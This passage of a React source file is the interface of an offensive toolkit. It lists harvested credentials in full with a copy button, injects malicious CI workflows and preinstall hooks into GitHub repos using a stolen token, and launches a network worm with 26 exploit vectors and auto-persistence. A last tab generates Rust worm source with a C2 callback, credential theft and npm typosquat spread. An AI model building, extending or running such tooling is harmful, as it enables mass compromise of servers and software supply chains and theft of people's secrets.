                    <p className="text-[9px] text-zinc-800 text-center mt-1">Detects {CRED_PATTERNS.length} credential types: AWS, GitHub, npm, PyPI, Google, Stripe, Slack, Discord, JWT, SSH, DB URIs, K8s, and more</p>
                  </div>
                )}
                {credScanned && credMatches.length === 0 && (
                  <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2"><span className="text-3xl opacity-20">✓</span><p className="text-[10px] uppercase tracking-widest">No credentials detected</p></div>
                )}
                {credMatches.length > 0 && (
                  <div className="p-3 space-y-1.5">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">{credMatches.length} credential{credMatches.length!==1?"s":""} found</div>
                    {credMatches.map((c,i) => (
                      <button key={i} onClick={()=>setSelectedCred(s=>s===c?null:c)}
                        className={`w-full text-left border p-2.5 transition-all ${selectedCred===c?"border-red-800 bg-red-950/20":"border-zinc-800 bg-black/20 hover:border-zinc-600"}`}>
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[c.severity]??SEV["medium"]}`}>{c.severity}</span>
                          <span className="text-[10px] font-bold text-white truncate">{c.kind}</span>
                        </div>
                        <div className="text-[9px] text-red-400 font-mono truncate">{c.redacted}</div>
                        <div className="text-[8px] text-zinc-700 mt-0.5">line {c.line}</div>
                        {selectedCred === c && (
                          <div className="mt-2 pt-2 border-t border-zinc-800">
                            <div className="text-[8px] text-zinc-600 mb-1">Full Value (handle with care)</div>
                            <div className="text-[9px] text-orange-400 font-mono break-all">{c.value}</div>
                            <button onClick={e=>{ e.stopPropagation(); navigator.clipboard.writeText(c.value); }}
                              className="mt-2 text-[8px] px-2 py-1 border border-zinc-800 text-zinc-600 hover:text-zinc-300 uppercase">Copy</button>
                          </div>
                        )}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── PROPAGATE TAB ────────────────────────────────────── */}
      {tab === "propagate" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-56 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">GitHub PAT</label>
              <input type="password" value={ghToken} onChange={e=>setGhToken(e.target.value)} placeholder="ghp_…"
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-2 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 font-mono" />
            </div>
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Injection Mode</label>
              {(["workflow","pkgjson","both"] as const).map(m => (
                <button key={m} onClick={()=>setPropMode(m)} className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-1 uppercase tracking-widest transition-all ${propMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
                  {m==="workflow"?".github/workflows/ci.yml":m==="pkgjson"?"package.json preinstall":"both vectors"}
                </button>
              ))}
            </div>
            <button onClick={fetchRepos} disabled={!ghToken.trim()} className="w-full py-2 text-[10px] border border-zinc-800 text-zinc-500 hover:border-zinc-600 hover:text-zinc-300 uppercase tracking-widest disabled:opacity-30">
              ↺ Fetch Repos
            </button>
            {repoList.length > 0 && (
              <button onClick={runPropagation} disabled={propRunning} className="w-full py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40 bg-red-950/20 border-red-800/50 text-red-400 hover:border-red-600">
                {propRunning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Propagating…</span> : `▶ Inject (${repoList.length} repos)`}
              </button>
            )}
            {propRunning && <button onClick={()=>{ propAbort.current?.abort(); setPropRunning(false); }} className="w-full py-1.5 text-[10px] border border-zinc-800 text-zinc-500 hover:text-red-400 uppercase">■ Abort</button>}
            {propResults.length > 0 && (
              <div className="text-[9px] text-zinc-600 border-t border-white/[.04] pt-2">
                <div className="text-green-400">{propResults.filter(r=>r.ok).length} ✓ injected</div>
                <div className="text-red-500">{propResults.filter(r=>!r.ok).length} ✗ failed</div>
              </div>
            )}
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div ref={propLogRef} className="flex-1 bg-black/80 px-4 py-3 overflow-y-auto font-mono">
              {propLog.length === 0 && (
                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-3">
                  <span className="text-4xl opacity-20">🕷</span>
                  <p className="text-[10px] uppercase tracking-widest">Enter a GitHub PAT and fetch repos to begin</p>
                  <p className="text-[9px] text-zinc-800 max-w-xs text-center">Live GitHub API injection — injects malicious CI workflows and package.json preinstall hooks directly via GitHub REST API from this browser session. No backend required.</p>
                </div>
              )}
              {propLog.map((l,i) => (
                <div key={i} className={`text-[9px] leading-[1.6] ${l.includes("✓")?"text-green-400":l.includes("✗")||l.includes("FAIL")||l.includes("ERROR")?"text-red-400":l.includes("▶")?"text-cyan-400":l.includes("■")?"text-orange-400":l.includes("→")?"text-zinc-400":"text-zinc-600"}`}>{l}</div>
              ))}
              {propRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● propagating via GitHub API…</div>}
            </div>
            {propResults.length > 0 && (
              <div className="border-t border-white/[.04] max-h-48 overflow-y-auto shrink-0">
                {propResults.map((r,i) => (
                  <div key={i} className={`flex items-center gap-3 px-4 py-1.5 border-b border-white/[.03] text-[9px] ${r.ok?"text-green-400":"text-red-400"}`}>
                    <span className="shrink-0">{r.ok?"✓":"✗"}</span>
                    <span className="font-bold w-32 truncate shrink-0">{r.repo}</span>
                    <span className="text-zinc-600 shrink-0">{r.action}</span>
                    <span className="text-zinc-500 truncate">{r.detail}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── NETWORK TAB ──────────────────────────────────────── */}
      {tab === "network" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Target CIDR</label>
              <input value={netCidr} onChange={e => setNetCidr(e.target.value)} placeholder="10.0.0.0/24"
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 font-mono" />
              <div className="text-[8px] text-zinc-700 mt-1">IPv4 CIDR — /24 = 254 hosts, /16 = 510 max</div>
            </div>
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">NexusForge Password</label>
              <input type="password" value={netPass} onChange={e => setNetPass(e.target.value)} placeholder="••••••••••••"
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 font-mono" />
            </div>
            <div className="border-t border-white/[.04] pt-3">
              <div className="text-[8px] text-zinc-700 mb-2 uppercase tracking-widest">Exploit Vectors (26)</div>
              {["Redis RESP RCE","Docker socket+escape","K8s unauth+DaemonSet","Kubelet /run exec","etcd v3 key dump","Consul KV+ACL","Jupyter kernel RCE","Jenkins Groovy","Grafana LFI+cred","Prometheus TSDB","Vault unseal dump","CouchDB OS cmd","InfluxDB query","memcached key dump","RabbitMQ mgmt","Apache Solr+log4j","Neo4j Cypher","MinIO bucket","ZooKeeper dump","Hadoop YARN RCE","PostgreSQL COPY","MySQL INTO OUTFILE","MSSQL xp_cmdshell","MongoDB unauth","Elasticsearch","SSH lateral+persist"].map(v => (
                <div key={v} className="text-[8px] text-zinc-600 leading-[1.7] flex items-center gap-1.5">
                  <span className="text-red-900">▸</span>{v}
                </div>
              ))}
            </div>
            <div className="flex gap-2 pt-1">
              <button onClick={runNetworkWorm} disabled={netRunning || !netPass.trim()}
                className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40"
                style={{ background: netRunning ? "transparent" : "rgba(220,38,38,.15)", borderColor: netRunning ? "rgba(255,255,255,.07)" : "rgba(220,38,38,.5)", color: netRunning ? "#52525b" : "#f87171" }}>
                {netRunning
                  ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin" />Worming…</span>
                  : "► Launch"}
              </button>
              {netRunning && (
                <button onClick={() => { netAbort.current?.abort(); setNetRunning(false); }}
                  className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>
              )}
            </div>
            {netDone && (
              <div className="border-t border-white/[.04] pt-2 space-y-1">
                <div className="text-[9px] text-red-400 font-bold">{netHits.length} hosts compromised</div>
                {netHits.length > 0 && (
                  <button onClick={() => { const csv = "host,port,method\n" + netHits.map(h => `${h.host},${h.port},${h.method}`).join("\n"); const a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([csv],{type:"text/csv"})); a.download = "worm-hits.csv"; a.click(); }}
                    className="w-full py-1.5 text-[9px] border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest">↓ Export CSV</button>
                )}
              </div>
            )}
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div ref={netLogRef} className={`bg-black/90 px-4 py-3 overflow-y-auto font-mono ${netHits.length > 0 ? "shrink-0" : "flex-1"}`} style={{ height: netHits.length > 0 ? "55%" : undefined }}>
              {netLog.length === 0 && !netRunning && (
                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-3">
                  <span className="text-5xl opacity-10">⚡</span>
                  <p className="text-[10px] uppercase tracking-widest">Network Worm Propagation Engine</p>
                  <div className="text-[9px] text-zinc-800 max-w-xs text-center space-y-1">
                    <p>Scans CIDR range with 64 concurrent threads</p>
                    <p>Ports: SSH, Redis, Docker, K8s, etcd, Consul, Jupyter, Jenkins, Grafana, Vault, CouchDB, InfluxDB, memcached, RabbitMQ, Solr, Neo4j, MinIO, ZooKeeper, Hadoop, PostgreSQL, MySQL, MSSQL, MongoDB, Elasticsearch</p>
                    <p>Auto-installs persistence on each hit: cron + authorized_keys + systemd + bashrc + profile + docker socket</p>
                  </div>
                </div>
              )}
              {netLog.map((l, i) => (
                <div key={i} className={`text-[9px] font-mono leading-[1.5] ${
                  l.includes("[+]") || l.includes("compromised") ? "text-red-400 font-bold" :
                  l.includes("[!]") || l.includes("ERROR") || l.includes("FAILED") ? "text-orange-400" :
                  l.includes("[worm]") ? "text-cyan-400" :
                  l.includes("Authenticated") || l.includes("complete") || l.includes("■") ? "text-green-400" :
                  l.includes("redis") || l.includes("Redis") ? "text-yellow-300" :
                  l.includes("docker") || l.includes("Docker") ? "text-blue-300" :
                  l.includes("k8s") || l.includes("K8s") || l.includes("kubelet") ? "text-purple-300" :
                  l.includes("ssh") || l.includes("SSH") ? "text-pink-300" :
                  "text-zinc-600"
                }`}>{l}</div>
              ))}
              {netRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● worm propagating — 64 concurrent exploit threads…</div>}
            </div>

            {netHits.length > 0 && (
              <div className="flex-1 border-t border-white/[.04] overflow-y-auto min-h-0">
                <div className="sticky top-0 bg-black/95 px-4 py-2 flex items-center gap-3 border-b border-white/[.04] shrink-0">
                  <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Compromised Hosts</span>
                  <span className="text-[9px] text-red-400 font-bold">{netHits.length} total</span>
                  <div className="ml-auto flex gap-4 text-[8px] text-zinc-700">
                    {["redis","docker","k8s","kubelet","etcd","consul","jupyter","jenkins","grafana","vault","couchdb","influxdb","memcached","rabbitmq","solr","neo4j","minio","zookeeper","hadoop","postgres","mysql","mssql","mongo","elastic","ssh"].map(svc => {
                      const count = netHits.filter(h => h.method.toLowerCase().includes(svc)).length;
                      return count > 0 ? <span key={svc} className="text-cyan-600">{svc}:{count}</span> : null;
                    })}
                  </div>
                </div>
                <div className="divide-y divide-white/[.03]">
                  {netHits.map((h, i) => (
                    <div key={i} className="flex items-center gap-3 px-4 py-2 hover:bg-white/[.02] text-[9px] font-mono">
                      <span className="text-red-500 shrink-0">⚡</span>
                      <span className="text-white font-bold w-28 shrink-0">{h.host}</span>
                      <span className="text-zinc-500 w-12 shrink-0">:{h.port}</span>
                      <span className={`text-[8px] px-1.5 py-0.5 border shrink-0 ${
                        h.method.startsWith("redis") ? "text-yellow-300 border-yellow-900" :
                        h.method.startsWith("docker") ? "text-blue-300 border-blue-900" :
                        h.method.startsWith("k8s") ? "text-purple-300 border-purple-900" :
                        h.method.startsWith("ssh") ? "text-pink-300 border-pink-900" :
                        h.method.startsWith("jenkins") || h.method.startsWith("groovy") ? "text-orange-300 border-orange-900" :
                        h.method.startsWith("jupyter") ? "text-cyan-300 border-cyan-900" :
                        h.method.startsWith("hadoop") || h.method.startsWith("yarn") ? "text-green-300 border-green-900" :
                        "text-zinc-400 border-zinc-700"
                      }`}>{h.method.split(":")[0]}</span>
                      <span className="text-zinc-600 truncate">{h.method}</span>
                      <button onClick={() => navigator.clipboard.writeText(`${h.host}:${h.port} ${h.method}`)}
                        className="ml-auto text-[8px] text-zinc-700 hover:text-zinc-400 shrink-0 px-1">⎘</button>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── RUSTGEN TAB ──────────────────────────────────────── */}
      {tab === "rustgen" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0">
              <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Rust Worm Source Generator</span>
              <span className="text-[8px] text-zinc-700">Generates compilable Rust source — Cargo.toml + 6 modules + build script</span>
              <div className="ml-auto flex items-center gap-3">
                {genDone && <button onClick={downloadAll} className="text-[9px] px-3 py-1.5 border border-zinc-700 text-zinc-400 hover:text-zinc-200 uppercase tracking-widest">↓ Download All</button>}
                <button onClick={generateRust}
                  className="text-[9px] px-4 py-1.5 border border-red-800/50 bg-red-950/20 text-red-400 hover:border-red-600 uppercase tracking-widest font-bold">
                  {genDone ? "↺ Regenerate" : "⚡ Generate"}
                </button>
              </div>
            </div>

            {!genDone ? (
              <div className="flex flex-col items-center justify-center flex-1 text-zinc-700 gap-4">
                <span className="text-5xl opacity-20">🦀</span>
                <p className="text-[10px] uppercase tracking-widest">Generate complete Rust worm binary source</p>
                <div className="text-[9px] text-zinc-800 max-w-sm text-center space-y-1">
                  <p>anti-analysis · credential harvesting · GitHub repo injection</p>
                  <p>persistence (bashrc, cron, systemd, git hooks)</p>
                  <p>XOR+HMAC-SHA256 binary C2 protocol over raw TCP</p>
                  <p>Self-propagating via npm typosquat + dep confusion</p>
                  <p>Polymorphic session tokens · Cross-compilation build script</p>
                </div>
                <p className="text-[8px] text-zinc-800">C2 callback: http://{cbHost||"LHOST"}:{cbPort||"9999"}</p>
              </div>
            ) : (
              <div className="flex-1 overflow-y-auto p-4 space-y-3 min-h-0">
                <div className="grid grid-cols-3 gap-2 mb-4 text-[9px] text-zinc-600">
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{rustFiles.length}</span>source files</div>
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{rustFiles.reduce((a,f)=>a+f.content.split("\n").length,0)}</span>lines of Rust</div>
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{Math.round(rustFiles.reduce((a,f)=>a+f.content.length,0)/1024)}KB</span>source size</div>
                </div>
                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Build instructions</div>
                <div className="bg-black/60 border border-zinc-800 p-3 text-[10px] text-green-400 font-mono mb-4">
                  <div># Clone output to a new directory</div>
                  <div>cargo new ironworm && cd ironworm</div>
                  <div># Replace files with generated source</div>
                  <div>chmod +x build.sh && ./build.sh</div>
                  <div># Output: dist/ironworm-linux-x64 (~1MB packed)</div>
                  <div># Cross-compile Windows: mingw-w64 required</div>
                </div>
                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Generated Files</div>
                {rustFiles.map((f,i) => <Artifact key={i} label={f.name} content={f.content} />)}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
